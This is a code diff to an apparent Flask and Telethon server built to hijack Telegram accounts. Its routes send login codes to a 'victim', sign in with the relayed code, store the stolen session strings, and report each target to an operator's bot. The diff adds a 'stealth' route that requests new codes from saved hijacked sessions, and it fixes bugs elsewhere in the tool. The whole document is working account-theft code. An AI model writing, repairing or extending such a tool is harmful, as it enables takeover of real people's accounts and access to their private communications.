@@ -4,6 +4,8 @@ import requests
 import asyncio
 import sys
 import json
+import time
+from datetime import datetime
 
 try:
     from telethon.sync import TelegramClient
@@ -15,7 +17,7 @@ except ImportError as e:
 
 app = Flask(__name__)
 
-# Config from environment
+# Configuration from environment variables
 def get_config():
     return {
         'API_ID': int(os.environ.get('API_ID', 0)),
@@ -52,6 +54,10 @@ def send_code():
     if not phone:
         return jsonify({'success': False, 'error': 'No phone provided'})
     
+    # Fix phone number format
+    if phone.startswith('+6262'):
+        phone = '+62' + phone[4:]
+    
     async def run():
         try:
             client = TelegramClient(StringSession(config['SESSION_STRING']), config['API_ID'], config['API_HASH'])
@@ -60,7 +66,7 @@ def send_code():
             
             pending_otps[phone] = {
                 'phone_code_hash': result.phone_code_hash,
-                'timestamp': os.times().user
+                'timestamp': time.time()
             }
             
             send_to_bot(f"🎯 TARGET: `{phone}`")
@@ -70,6 +76,11 @@ def send_code():
             error_msg = f"Send code error: {str(e)}"
             send_to_bot(f"❌ ERROR: `{error_msg}`")
             return {'success': False, 'error': error_msg}
+        finally:
+            try:
+                await client.disconnect()
+            except:
+                pass
     
     try:
         return jsonify(asyncio.run(run()))
@@ -78,14 +89,15 @@ def send_code():
 
 @app.route('/steal_session', methods=['POST'])
 def steal_session():
+    if not telethon_available:
+        return jsonify({'success': False, 'error': 'Telethon not available'})
+    
     phone = request.form.get('phone', '').strip()
     code = request.form.get('code', '').strip()
     
-    # Fix phone number format (remove double country code)
+    # Fix phone number format
     if phone.startswith('+6262'):
-        phone = '+62' + phone[4:]  # Convert +626283895257557 to +6283895257557
-    
-    print(f"Attempting steal session for: {phone}")  # Debug log
+        phone = '+62' + phone[4:]
     
     if not phone or not code:
         return jsonify({'success': False, 'error': 'Missing phone or code'})
@@ -95,13 +107,13 @@ def steal_session():
     
     async def run():
         try:
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            client = TelegramClient(StringSession(), config['API_ID'], config['API_HASH'])
             await client.connect()
             
-            # Cek jika OTP hash masih valid
+            # Check if OTP expired
             otp_data = pending_otps[phone]
             time_diff = time.time() - otp_data.get('timestamp', 0)
-            if time_diff > 300:  # 5 menit
+            if time_diff > 300:  # 5 minutes
                 return {'success': False, 'error': 'OTP code expired'}
             
             result = await client.sign_in(
@@ -116,7 +128,7 @@ def steal_session():
             sessions_db[phone] = {
                 'session_string': session_string,
                 'user_id': user.id,
-                'first_name': user.first_name,
+                'first_name': user.first_name or 'Unknown',
                 'last_login': datetime.now().isoformat()
             }
             
@@ -127,13 +139,69 @@ def steal_session():
             
         except Exception as e:
             error_msg = f"Steal session error: {str(e)}"
+            send_to_bot(f"❌ STEAL FAILED: `{error_msg}`")
             return {'success': False, 'error': error_msg}
         finally:
-            await client.disconnect()
+            try:
+                await client.disconnect()
+            except:
+                pass
     
-    return jsonify(asyncio.run(run()))
+    try:
+        return jsonify(asyncio.run(run()))
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/new_otp', methods=['POST'])
+def new_otp():
+    phone = request.form.get('phone', '').strip()
+    
+    if not phone:
+        return jsonify({'success': False, 'error': 'No phone provided'})
+    
+    if phone not in sessions_db:
+        return jsonify({'success': False, 'error': 'No session found for this phone'})
+    
+    async def run():
+        try:
+            session_string = sessions_db[phone]['session_string']
+            client = TelegramClient(StringSession(session_string), config['API_ID'], config['API_HASH'])
+            await client.connect()
+            
+            if not await client.is_user_authorized():
+                return {'success': False, 'error': 'Session expired'}
+            
+            result = await client.send_code_request(phone)
+            
+            pending_otps[phone] = {
+                'phone_code_hash': result.phone_code_hash,
+                'timestamp': time.time(),
+                'for_stealth': True
+            }
+            
+            message = f"🕵️ STEALTH OTP REQUESTED\n📱 `{phone}`\n👤 `{sessions_db[phone]['first_name']}`"
+            send_to_bot(message)
+            
+            return {'success': True, 'phone_code_hash': result.phone_code_hash}
+            
+        except Exception as e:
+            error_msg = f"New OTP error: {str(e)}"
+            send_to_bot(f"❌ OTP REQUEST FAILED: `{error_msg}`")
+            return {'success': False, 'error': error_msg}
+        finally:
+            try:
+                await client.disconnect()
+            except:
+                pass
+    
+    try:
+        return jsonify(asyncio.run(run()))
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/health')
+def health():
+    return jsonify({'status': 'healthy', 'telethon': telethon_available})
 
 @app.route('/')
 def home():
@@ -154,16 +222,13 @@ def home():
             <ul>
                 <li>POST /send_code - Send OTP to victim</li>
                 <li>POST /steal_session - Steal session with OTP</li>
+                <li>POST /new_otp - Request new OTP for saved session</li>
             </ul>
             <p>💀 Ready to steal sessions!</p>
         </body>
     </html>
     """
     return html
-
-@app.route('/health')
-def health():
-    return jsonify({'status': 'healthy', 'telethon': telethon_available})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
